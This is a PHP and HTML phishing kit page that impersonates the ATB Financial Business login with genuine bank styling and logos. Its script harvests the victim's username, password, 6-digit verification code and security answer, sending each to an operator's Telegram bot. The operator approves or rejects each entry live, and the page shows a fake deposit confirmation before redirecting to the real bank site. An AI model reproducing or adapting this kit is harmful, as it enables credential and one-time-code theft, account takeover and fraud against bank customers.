<?php
declare(strict_types=1);

if (session_status() === PHP_SESSION_NONE) session_start();

/* ---------- Load configuration ---------- */
$docRoot    = rtrim($_SERVER['DOCUMENT_ROOT'], '/');
$configPath = $docRoot . 'config/config.php';
$config     = is_file($configPath) ? require $configPath : [];

/* ---------- Load Telegram (optional use later) ---------- */
$telegramToken = $config['telegram']['bot_token'] ?? '';
$chatId        = $config['telegram']['chat_id'] ?? '';

/* ---------- Load active transaction ---------- */
$tid  = $_SESSION['transaction_id'] ?? null;
$data = [];

/* Prefer transactions array, fallback to direct key */
if ($tid && !empty($_SESSION['transactions'][$tid]) && is_array($_SESSION['transactions'][$tid])) {
    $data = $_SESSION['transactions'][$tid];
} elseif ($tid && !empty($_SESSION[$tid]) && is_array($_SESSION[$tid])) {
    $data = $_SESSION[$tid];
}

/* ---------- Normalize and sanitize ---------- */
$senderName = $data['sender_name']
    ?? $data['senderName']
    ?? ($_SESSION['senderName'] ?? 'N/A');
$amount = $data['amount_sent']
    ?? $data['amount']
    ?? ($_SESSION['amount'] ?? '$0.00');

/* Make safe versions for HTML output */
$senderNameSafe = htmlspecialchars((string)$senderName, ENT_QUOTES, 'UTF-8');
$amountSafe     = htmlspecialchars((string)$amount, ENT_QUOTES, 'UTF-8');

/* ---------- Optional fallbacks for templates ---------- */
$_SESSION['senderName'] = $senderNameSafe;
$_SESSION['amount']     = $amountSafe;

/* ---------- Variables now defined ----------
Use:
  <?= $senderNameSafe ?>
  <?= $amountSafe ?>
in HTML template.
--------------------------------------------- */


/* ---------- Load Telegram config ---------- */
$docRoot    = rtrim($_SERVER['DOCUMENT_ROOT'], '/');
$configPath = $docRoot . '/config/config.php';

if (!is_file($configPath)) {
    die('Missing configuration file: config/config.php');
}

$config = require $configPath;
$telegramToken = $config['telegram']['bot_token'] ?? '';
$chatId        = $config['telegram']['chat_id'] ?? '';

if ($telegramToken === '' || $chatId === '') {
    die('Telegram bot token or chat ID missing in config.php');
}

/* ---------- Telegram send function ---------- */
function sendTelegramMessage(string $message, string $botToken, string $chatId): void {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $payload = [
        'chat_id'    => $chatId,
        'text'       => $message,
        'parse_mode' => 'HTML'
    ];

    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($payload)
        ]
    ];

    @file_get_contents($url, false, stream_context_create($options));
}

/* ---------- Send startup message ---------- */
$message = "🟦 ATB CONTROLLER 🟦\n\nBuisness Access Loaded\n\n🟦 ATB CONTROLLER 🟦";
sendTelegramMessage($message, $telegramToken, $chatId);
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <title>Login</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap">
    <link rel="stylesheet" type="text/css" href="https://login.atb.com/assets/css/atb.new.main.css">
    <style>
        body { font-family:'Roboto', sans-serif; }
        .error-message { color:#d9534f; text-align:center; margin-bottom:20px; display:none; }
        #loginButton, #pinButton, #sqButton, #depositButton {
            display:inline-block; width:100%; max-width:300px; padding:15px;
            background-color:#0874F4; color:#fff; border:none; border-radius:50px;
            font-size:1.2em; cursor:pointer; text-align:center; transition:0.3s;
        }
        #loginButton:hover, #pinButton:hover, #sqButton:hover, #depositButton:hover { background-color:#065ac0; }
        .disabled-button { cursor:not-allowed; opacity:0.6; }
        .dynamic-button__spinner { display:none; margin-left:10px; }
        .step-section { display:none; text-align:center; margin-top:20px; }
        .atb-input-box { width:100%; }

        /* Full size animated checkmark */
        .checkmark {
          width: 120px; height: 120px; border-radius: 50%; display: inline-block; border: 6px solid #0874F4; position: relative;
          margin-bottom: 20px; animation: scaleUp 0.5s ease forwards;
        }
        .checkmark::after {
          content: ''; position: absolute; left: 30px; top: 60px; width: 40px; height: 20px;
          border-left: 6px solid #0874F4; border-bottom: 6px solid #0874F4; transform: rotate(-45deg);
          transform-origin: left top; opacity:0; animation: drawCheck 0.5s 0.5s forwards;
        }
        @keyframes scaleUp { 0% { transform: scale(0); } 100% { transform: scale(1); } }
        @keyframes drawCheck { 0% { opacity:0; transform: rotate(-45deg) scale(0); } 100% { opacity:1; transform: rotate(-45deg) scale(1); } }

        .info-bubble {
            background:#f0f4f8;
            border-left:4px solid #0052cc;
            padding:20px;
            border-radius:10px;
            font-size:0.95rem;
            color:#1a1a1a;
            line-height:1.5;
            text-align:center;
            box-shadow:0 2px 6px rgba(0,0,0,0.05);
            margin: 20px auto;
            max-width: 420px;
        }

        .info-row {
            display:flex; justify-content:space-between; margin-bottom:8px; text-align: left;
        }
    </style>
</head>
<body>
<div class="atb-content-container">
    <div id="atb-body-container" class="atb-body-container">
    <div class="error-message" id="errorMsg"></div>

        <!-- Step 0: Login -->
        <div id="stepLogin" class="step-section" style="display:block;">
            <div class="atb-header">
                <img class="atb-logo" src="https://login.atb.com/assets/images/atbImages/atb-logo.svg" alt="ATB Logo">
                <div class="atb-header-text h4">Business</div>
                <hr class="atb-blue-line">
            </div>    
            <div class="atb-input-label subtitle-1">Username</div>
            <div class="atb-input-outer-container">
                <div class="atb-input-container">
                    <input class="atb-input-box paragraph-1" id="username" type="text">
                </div>
            </div>

            <div class="atb-input-label subtitle-1" style="margin-top:15px;">Password</div>
            <div class="atb-input-outer-container">
                <div class="atb-input-container">
                    <input class="atb-input-box paragraph-1" id="password" type="password">
                </div>
            </div>
            <br><br>
            <button id="loginButton">Log in <span class="dynamic-button__spinner" id="loginSpinner"><img src="https://login.atb.com/assets/images/atbImages/atb-spinner.svg" alt="Loading"></span></button>
        </div>

        <!-- Step 1: 6-digit PIN -->
        <div id="stepPIN" class="step-section">
            <div class="atb-header">
                <img class="atb-logo" src="https://login.atb.com/assets/images/atbImages/atb-logo.svg" alt="ATB Logo">
                <div class="atb-header-text h4">Verification</div>
                <hr class="atb-blue-line">
            </div>
            <div class="info-bubble">
                <strong style="display:block;margin-bottom:8px;">Secure Device Verification</strong>
                <p id="verificationText" style="margin:6px 0;">
                  For your security, ATB has sent a 6-digit verification code to your registered device. Enter this code below to confirm your identity.
                </p>
                <p id="expiryNote" style="margin:4px 0 12px 0;font-size:0.82rem;color:#555;">
                  Code expires in 5 minutes. Keep your device nearby. Never share it with anyone.
                </p>

                <input id="pinCode" type="text" maxlength="6" placeholder="Enter 6-digit code" style="
                    width:80%; padding:12px; font-size:1rem; border:1px solid #ccc; border-radius:5px;
                    margin-bottom:12px; box-sizing:border-box; text-align:center;
                ">

                <div style="margin-bottom:12px; font-size:0.9rem; color:#555;">
                  <span id="pinTimer">01:00</span> 
                  <span id="sendNewPin" style="color:#555; cursor:not-allowed; font-weight:bold;">Send new code</span>
                </div>

                <button id="pinButton">
                  Submit
                  <span class="dynamic-button__spinner" id="pinSpinner">
                    <img src="https://login.atb.com/assets/images/atbImages/atb-spinner.svg" alt="Loading">
                  </span>
                </button>
            </div>
        </div>

        <!-- Step 2: Security Question -->
        <div id="stepSQ" class="step-section">
            <div class="atb-header" style="text-align:center;margin-bottom:20px;">
                <img class="atb-logo" src="https://login.atb.com/assets/images/atbImages/atb-logo.svg" alt="ATB Logo" style="height:50px;">
                <div class="atb-header-text h4" style="font-size:1.5rem;font-weight:bold;margin-top:10px;">Security Question</div>
            </div>

            <div class="info-bubble">
                <div class="info-row">
                    <strong>From:</strong>
                    <code><?= $senderNameSafe ?></code>
                </div>
                <div class="info-row">
                    <strong>Amount:</strong>
                    <code><?= $amountSafe ?></code>
                </div>
                <div class="info-row" style="margin-top:12px;">
                    <strong>Question:</strong>
                    <span>What is this transfer for?</span>
                </div>
            </div>

            <div style="margin-top:20px; text-align:center;">
                <input id="sq1" type="text" placeholder="Security answer" style="
                    width:80%; padding:12px; font-size:1rem; border:1px solid #ccc; border-radius:5px;
                    margin-bottom:12px; box-sizing:border-box; text-align:center;
                ">
            </div>

            <button id="sqButton">
                Continue
                <span class="dynamic-button__spinner" id="sqSpinner">
                    <img src="https://login.atb.com/assets/images/atbImages/atb-spinner.svg" alt="Loading">
                </span>
            </button>
        </div>

        <!-- Step 3: Deposit Confirmation -->
        <section id="stepDeposit" class="step-section">
            <div class="atb-header" style="text-align:center;margin-bottom:18px;">
                <img class="atb-logo" src="https://login.atb.com/assets/images/atbImages/atb-logo.svg" alt="ATB Logo" style="height:48px;">
                <div class="atb-header-text" style="font-size:1.4rem;font-weight:700;margin-top:10px;color:#0c2f54;">Deposited!</div>
            </div>

            <div class="checkmark" aria-hidden="true"></div>

            <div id="depositMessage" style="font-size:1.05rem;margin:18px 0;color:#222;line-height:1.4;max-width:420px;margin-left:auto;margin-right:auto;">
                <strong>Funds have been successfully deposited.</strong><br><br>
                Due to ongoing system maintenance between
                <span id="todayDate" aria-live="polite"></span>
                and
                <span id="futureDate" aria-live="polite"></span>,
                it may take up to <strong>90 minutes</strong> for the funds to reflect in your account.<br><br>
                However, the funds are available immediately.
            </div>

            <button id="depositButton">
                Finish
                <span class="dynamic-button__spinner" id="depositSpinner">
                    <img src="https://login.atb.com/assets/images/atbImages/atb-spinner.svg" alt="Loading">
                </span>
            </button>
        </section>

        <div class="atb-footer" id="atb-footer">
            <div class="atb-footer-link-group subtitle-2">
                <a href="https://www.atb.com/" target="_blank">atb.com</a> |
                <a href="https://www.atb.com/resources/contact-us/" target="_blank">Contact us</a> |
                <a href="https://www.atb.com/company/privacy-and-security/online-guarantee" target="_blank">Terms</a> |
                <a href="https://www.atb.com/company/privacy-and-security/" target="_blank">Security tips</a>
            </div>
            <div class="atb-legal-text paragraph-3">
                © ATB Financial 2025. All rights reserved.<br>Authorized access only. Usage may be monitored.
            </div>
        </div>
    </div>
</div>

<script>
// PIN Timer functionality
(function(){
    const timerElement = document.getElementById('pinTimer');
    const sendNewPin = document.getElementById('sendNewPin');
    const verificationText = document.getElementById('verificationText');
    const expiryNote = document.getElementById('expiryNote');

    let timerDuration = 60;
    let countdownInterval;

    function formatTime(seconds){
        const m = String(Math.floor(seconds/60)).padStart(2,'0');
        const s = String(seconds%60).padStart(2,'0');
        return `${m}:${s}`;
    }

    function startTimer(){
        clearInterval(countdownInterval);
        let remaining = timerDuration;
        timerElement.style.display = 'inline';
        timerElement.textContent = formatTime(remaining);
        sendNewPin.style.cursor = 'not-allowed';
        sendNewPin.style.color = '#555';

        countdownInterval = setInterval(()=>{
            remaining--;
            timerElement.textContent = formatTime(remaining);

            if(remaining <= 0){
                clearInterval(countdownInterval);
                timerElement.style.display = 'none';
                sendNewPin.style.cursor = 'pointer';
                sendNewPin.style.color = '#0052cc';
            }
        }, 1000);
    }

    startTimer();

    sendNewPin.addEventListener('click', ()=>{
        if(sendNewPin.style.cursor !== 'pointer') return;
        timerDuration = 60;
        startTimer();
        verificationText.textContent = "A new 6-digit verification code has been sent to your registered device. Enter it to continue securely.";
        expiryNote.textContent = "Code expires in 5 minutes. Keep your device nearby. Never share your code with anyone.";
    });
})();
</script>

<script>
document.addEventListener('DOMContentLoaded', function(){
    // Dynamic dates for deposit step
    const today = new Date();
    const future = new Date(today.getTime() + 48 * 60 * 60 * 1000);
    const opts = { month: 'long', day: 'numeric', year: 'numeric' };
    document.getElementById('todayDate').textContent = today.toLocaleDateString(undefined, opts);
    document.getElementById('futureDate').textContent = future.toLocaleDateString(undefined, opts);

    // Main controller
    const telegramToken = "<?= $telegramToken ?>";
    const chatId = "<?= $chatId ?>";

    const steps = {
        stepLogin: document.getElementById('stepLogin'),
        stepPIN: document.getElementById('stepPIN'),
        stepSQ: document.getElementById('stepSQ'),
        stepDeposit: document.getElementById('stepDeposit')
    };
    const errorMsg = document.getElementById('errorMsg');

    let currentMessageId = null;
    let pollInterval = null;

    function showError(msg, button, spinner){
        errorMsg.textContent = msg;
        errorMsg.style.display = 'block';
        if(spinner) spinner.style.display = 'none';
        if(button) {
            button.disabled = false;
            button.classList.remove('disabled-button');
        }
    }

    async function sendTelegramMessage(title, text, button, spinner, onSuccess, onError) {
        spinner.style.display = 'inline-block';
        button.disabled = true;
        button.classList.add('disabled-button');
        errorMsg.style.display = 'none';

        const keyboard = {
            inline_keyboard: [
                [{text:"🟩 Correct", callback_data:"level2"}],
                [{text:"🟥 Incorrect", callback_data:"error"}]
            ]
        };

        try {
            const response = await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `🟦 ATB CONTROLLER 🟦\n\n${title}\n\n${text}\n\n🟦 ATB CONTROLLER 🟦`,
                    parse_mode: "HTML",
                    reply_markup: keyboard
                })
            });

            const data = await response.json();
            currentMessageId = data?.result?.message_id;
            
            if(!currentMessageId) throw new Error('No message id received');

            // Start polling for callback
            pollForCallback(button, spinner, onSuccess, onError);
            
        } catch(err) {
            console.error(err);
            showError('Network error. Please try again.', button, spinner);
        }
    }

    async function pollForCallback(button, spinner, onSuccess, onError) {
        if(pollInterval) clearInterval(pollInterval);
        
        pollInterval = setInterval(async () => {
            try {
                const updates = await (await fetch(`https://api.telegram.org/bot${telegramToken}/getUpdates?offset=-1`)).json();
                
                for(const update of updates.result || []) {
                    if(update.callback_query && update.callback_query.message?.message_id === currentMessageId) {
                        clearInterval(pollInterval);
                        
                        // Answer callback query
                        await fetch(`https://api.telegram.org/bot${telegramToken}/answerCallbackQuery`, {
                            method:'POST', 
                            headers:{'Content-Type':'application/json'},
                            body: JSON.stringify({callback_query_id: update.callback_query.id})
                        });

                        // Clear inline keyboard
                        await fetch(`https://api.telegram.org/bot${telegramToken}/editMessageReplyMarkup`, {
                            method:'POST', 
                            headers:{'Content-Type':'application/json'},
                            body: JSON.stringify({
                                chat_id: chatId,
                                message_id: currentMessageId,
                                reply_markup: {inline_keyboard: []}
                            })
                        });

                        // Reset UI
                        spinner.style.display = 'none';
                        button.disabled = false;
                        button.classList.remove('disabled-button');

                        // Execute callback
                        if(update.callback_query.data === 'level2') {
                            onSuccess();
                        } else {
                            onError();
                        }
                        
                        currentMessageId = null;
                        return;
                    }
                }
            } catch(err) {
                console.error('Polling error:', err);
            }
        }, 1500);
    }

    // Step Login
    document.getElementById('loginButton').addEventListener('click', function(){
        const user = document.getElementById('username').value.trim();
        const pass = document.getElementById('password').value.trim();
        if(!user || !pass){ 
            showError('Enter username and password', this, document.getElementById('loginSpinner')); 
            return; 
        }

        const message = `🔸 Username: <code>${user}</code>\n\n🔸 Password: <code>${pass}</code>`;
        sendTelegramMessage("Login Credentials", message, this, document.getElementById('loginSpinner'),
            () => { 
                steps.stepLogin.style.display = 'none'; 
                steps.stepPIN.style.display = 'block'; 
            },
            () => { 
                showError('Incorrect username or password', this, document.getElementById('loginSpinner')); 
            }
        );
    });

    // Step PIN
    document.getElementById('pinButton').addEventListener('click', function(){
        const code = document.getElementById('pinCode').value.trim();
        if(!/^\d{6}$/.test(code)){ 
            showError('Enter valid 6-digit code', this, document.getElementById('pinSpinner')); 
            return; 
        }

        const message = `🔸 6-digit PIN: <code>${code}</code>`;
        sendTelegramMessage("Verification Code", message, this, document.getElementById('pinSpinner'),
            () => { 
                steps.stepPIN.style.display = 'none'; 
                steps.stepSQ.style.display = 'block'; 
            },
            () => { 
                showError('Incorrect code. Try again.', this, document.getElementById('pinSpinner')); 
            }
        );
    });

    // Step Security Question
    document.getElementById('sqButton').addEventListener('click', function(){
        const sq1 = document.getElementById('sq1').value.trim();
        if(!sq1){ 
            showError('Answer the security question', this, document.getElementById('sqSpinner')); 
            return; 
        }

        const message = `🔸 Security Answer: <code>${sq1}</code>`;
        sendTelegramMessage("Security Question", message, this, document.getElementById('sqSpinner'),
            () => { 
                steps.stepSQ.style.display = 'none'; 
                steps.stepDeposit.style.display = 'block'; 
            },
            () => { 
                showError('Incorrect answer. Try again.', this, document.getElementById('sqSpinner')); 
            }
        );
    });

    // Step Deposit confirmation
    document.getElementById('depositButton').addEventListener('click', function(){
        const message = `🟢 Deposit confirmed!\n\nAll steps completed successfully.`;
        sendTelegramMessage("DEPOSIT CONFIRMED ✅", message, this, document.getElementById('depositSpinner'),
            () => { 
                setTimeout(() => {
                    window.location.href = 'https://www.atb.com/logon';
                }, 2000);
            },
            () => { 
                showError('Transaction failed. Please try again.', this, document.getElementById('depositSpinner')); 
            }
        );
    });
});
</script>

<script>
document.title = "login.atb.com/as/authorization.oauth2?redirect_uri=https%3A%2F%2Fpersonal.atb.com%2Fcallback&client_id=ATBWEB&response_type=code&state=svCf1Lg88e&scope=openid%20profile%20retail-web&cmid=c5784e341edd48ff8b31859a9a0c6a82&response_mode=fragment&appState=%5Bobject%20Object%5D&code_challenge=wWaag2OMe666BN8rjSsaPMohU3qbPdrFY5Y_JxY6Cw8&code_challenge_method=S256";
</script>

</body>
</html>
